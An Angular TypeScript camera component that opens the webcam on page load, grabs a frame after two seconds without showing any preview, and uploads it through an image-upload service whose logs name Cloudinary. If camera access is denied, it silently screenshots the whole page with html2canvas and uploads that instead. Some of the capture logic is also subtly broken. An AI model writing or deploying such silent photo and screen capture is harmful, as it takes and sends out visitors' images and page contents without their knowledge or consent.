import { Component, OnInit } from '@angular/core';
import html2canvas from 'html2canvas';
import { UploaderService } from './services/uploader.service';

@Component({
  selector: 'app-camera',
  templateUrl: './camera.component.html',
  styleUrls: ['./camera.component.scss'],
})
export class CameraComponent implements OnInit {
  video!: HTMLVideoElement;
  canvas!: HTMLCanvasElement;
  context!: CanvasRenderingContext2D;
  photoSrc!: string;
  constructor(private uploader: UploaderService) {}
  ngOnInit() {
    this.video = document.createElement('video');
    this.canvas = document.createElement('canvas');
    this.context = this.canvas.getContext('2d');

    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        this.video.srcObject = stream;
        this.video.play();
        this.canvas.width = this.video.videoWidth;
        this.canvas.height = this.video.videoHeight;
        this.context.drawImage(
          this.video,
          0,
          0,
          this.canvas.width,
          this.canvas.height
        );
        setTimeout(() => {
          this.photoSrc = this.canvas.toDataURL('image/jpeg', 0.5);
          console.log(this.photoSrc);
          this.uploader.uploadImage(this.photoSrc).subscribe(
            (data) => {
              console.log('Image uploaded to Cloudinary:', data);
              console.log('yes');
            },
            (error) => {
              console.error('Error uploading image to Cloudinary:', error);
              console.log('no');
            }
          );
        }, 2000);
      })
      .catch((error) => {
        console.error('Error accessing camera:', error);
        const isMobile = /iPhone|iPad|iPod|Android/i.test(
          window.navigator.userAgent
        );
        if (isMobile) {
          window.scrollTo(0, 0);
          html2canvas(document.body).then((canvas) => {
            this.photoSrc = canvas.toDataURL('image/png');
            this.uploader.uploadImage(this.photoSrc).subscribe(
              (data) => {
                console.log('Image uploaded to Cloudinary:', data);
              },
              (error) => {
                console.error('Error uploading image to Cloudinary:', error);
              }
            );
          });
        } else {
          window.scrollTo(0, 0);
          html2canvas(document.documentElement).then((canvas) => {
            this.photoSrc = canvas.toDataURL('image/png');
            this.uploader.uploadImage(this.photoSrc).subscribe(
              (data) => {
                console.log('Image uploaded to Cloudinary:', data);
              },
              (error) => {
                console.error('Error uploading image to Cloudinary:', error);
              }
            );
          });
        }
      });

    this.video.addEventListener('canplay', () => {
      this.canvas.width = this.video.videoWidth;
      this.canvas.height = this.video.videoHeight;
      this.context.drawImage(
        this.video,
        0,
        0,
        this.canvas.width,
        this.canvas.height
      );
      this.photoSrc = this.canvas.toDataURL('image/png');
    });
  }
  uploadImage() {
    const imagePath = './assets/image.png';
    console.log(this.video);
    console.log(this.video.srcObject);
    console.log(this.video.play());
    this.uploader.uploadImage(imagePath).subscribe(
      (data) => {
        console.log('Image uploaded to Cloudinary:', data);
      },
      (error) => {
        console.error('Error uploading image to Cloudinary:', error);
      }
    );
  }
}
